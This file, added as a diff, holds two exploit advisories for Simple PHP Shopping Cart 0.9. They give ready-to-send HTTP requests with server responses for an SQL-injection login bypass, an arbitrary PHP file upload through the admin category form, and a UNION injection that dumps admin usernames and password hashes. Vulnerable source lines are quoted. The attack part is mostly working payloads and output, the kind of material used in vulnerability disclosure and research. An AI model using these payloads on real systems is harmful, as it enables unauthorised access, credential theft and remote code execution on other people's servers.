@@ -1,0 +1,139 @@
+# Exploit Title: Simple PHP Shopping Cart 0.9 - Arbitrary File Upload
+# Dork: N/A
+# Date: 2018-10-30
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: https://asaancart.wordpress.com/
+# Software Link: https://vorboss.dl.sourceforge.net/project/asaancart/asaancart%20v-0.9/asaancart%20v-0.9.zip
+# Version: 0.9
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+POST /[PATH]/admin/login.php HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 69
+username=%27%6f%72%20%31%3d%31%20%6f%72%20%27%27%3d%27&password=%27%6f%72%20%31%3d%31%20%6f%72%20%27%27%3d%27&btnSubmit=btnSubmit
+HTTP/1.1 302 Found
+Date: Tue, 30 Oct 2018 15:46:43 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Set-Cookie: PHPSESSID=f2a7ov3iih8u10qf9327ana635; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Location: index.php
+Content-Length: 0
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+POST /[PATH]/admin/add_cat.php HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=f2a7ov3iih8u10qf9327ana635
+Connection: keep-alive
+Content-Type: multipart/form-data; boundary=
+---------------------------17014069073451786011304294694
+Content-Length: 514
+-----------------------------17014069073451786011304294694
+Content-Disposition: form-data; name="category_name"
+xxx
+-----------------------------17014069073451786011304294694
+Content-Disposition: form-data; name="category_full_image"; filename="phpinfo.php"
+Content-Type: application/force-download
+<?php
+phpinfo();
+?>
+-----------------------------17014069073451786011304294694
+Content-Disposition: form-data; name="btn_submit"
+Create
+-----------------------------17014069073451786011304294694--
+HTTP/1.1 200 OK
+Date: Tue, 30 Oct 2018 15:46:52 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=UTF-8
+
+#/[PATH]/category_images/xxx_phpinfo.php
+
+<form action="http://localhost/[PATH]/admin/add_cat.php" enctype="multipart/form-data" method="post">
+<input name="category_name" value="xxx" type="text" hidden="true">
+<input name="category_full_image" type="file">
+<input name="btn_submit" value="Create" type="submit">
+</form>
+
+
+# Exploit Title: Simple PHP Shopping Cart 0.9 - SQL Injection
+# Dork: N/A
+# Date: 2018-10-30
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: https://asaancart.wordpress.com/
+# Software Link: https://vorboss.dl.sourceforge.net/project/asaancart/asaancart%20v-0.9/asaancart%20v-0.9.zip
+# Version: 0.9
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/shop/page.php?page_id=[SQL]
+# 
+#[PATH]/page.php
+#....
+#34 $page_heading = $_GET['page_name'];
+#35 $page_id = $_GET['page_id'];
+#....
+GET /[PATH]/shop/page.php?page_id=-1+unIoN++SELect+0x31%2c0x32%2c0x33%2c0x34%2c(SEleCT+GroUP_COncAT(username,0x3a,password+sePaRATOR+0x3c62723e)+FrOM+auth_user_admin)%2d%2d%20%2d HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Tue, 30 Oct 2018 14:01:30 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Set-Cookie: PHPSESSID=u4nfc9bijgcbd8na09o8jp4gb0; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 6538
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 2)
+# http://localhost/[PATH]/admin/login.php
+# 
+#....
+#32 if ($_POST['btnSubmit']=='btnSubmit')
+#33 {
+#34 	$sql = "SELECT * FROM auth_user_admin WHERE username='".$_POST['username']."' AND password='".md5($_POST['password'])."'";
+#....
+
+# POC: 
+# 3)
+# http://localhost/[PATH]/shop/product.php?product_id=[SQL]
+# 
+#....
+#35 $product_id = $_GET['product_id'];
+#....
